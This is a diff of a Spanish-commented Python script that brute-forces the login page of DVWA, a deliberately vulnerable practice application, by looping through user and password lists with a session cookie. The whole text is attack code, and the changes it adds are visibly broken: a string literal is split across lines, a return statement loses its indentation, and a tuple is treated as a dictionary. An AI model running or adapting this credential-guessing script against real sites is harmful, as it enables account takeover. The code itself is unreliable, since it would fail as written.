@@ -10,9 +10,12 @@ passwords_file = 'passwordlist.txt'
 
 # Cabeceras HTTP a utilizar para la solicitud
 headers = {
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
-    'Content-Type': 'application/x-www-form-urlencoded'
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64;
+ x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Cookie': 'security=low'    
 }
+
 
 # Datos de inicio de sesión
 login_data = {
@@ -27,18 +30,20 @@ def read_lines(file_path):
 
 def get_php_session_id():
     # Realiza una solicitud POST para iniciar sesión
-    response = requests.post(url_login, params=login_data)
+    response = requests.post(url_login,headers=headers, params=login_data)
     # Extrae la cookie PHPSESSID
     cookies = response.cookies
-    return cookies.get('PHPSESSID')
+    print(response.cookies.get('PHPSESSID'))
+return response.headers, cookies.get('PHPSESSID')
 
-def brute_force_attack(session_id):
+def brute_force_attack(info):
     users = read_lines(users_file)
     passwords = read_lines(passwords_file)
 
-    # Cabeceras HTTP con la cookie PHPSESSID actualizada
+    print(info.get('PHPSESSID')) 
+   # Cabeceras HTTP con la cookie PHPSESSID actualizada
     cookies = {
-        'PHPSESSID': session_id,
+        'PHPSESSID': info.get('PHPSESSID'),
         'security': 'low'  # Nivel de seguridad bajo en DVWA
     }
 
@@ -50,18 +55,18 @@ def brute_force_attack(session_id):
                 'Login': 'Login'
             }
 
-            response = requests.post(url_brute, headers=headers, cookies=cookies, params=data)
+            response = requests.post(url_brute, headers=info, cookies=cookies, params=data)
             soup = BeautifulSoup(response.text, 'html.parser')
-
+            print(soup)
             # Verifica el contenido de la página para encontrar el mensaje correcto
-            if 'Welcome to the password protected area' in soup.text:
+            if 'Welcome to the password protected' in soup:
                 print(f'[SUCCESS] Usuario: {username} Contraseña: {password}')
             else:
                 pass
 
 # Obtén el PHPSESSID y realiza el ataque
-session_id = get_php_session_id()
-if session_id:
-    brute_force_attack(session_id)
-else:
-    print('No se pudo obtener el PHPSESSID.')
+#session_id = get_php_session_id()[0]
+#headers= get_php_session_id()[1]
+print(get_php_session_id())
+brute_force_attack(get_php_session_id())
+
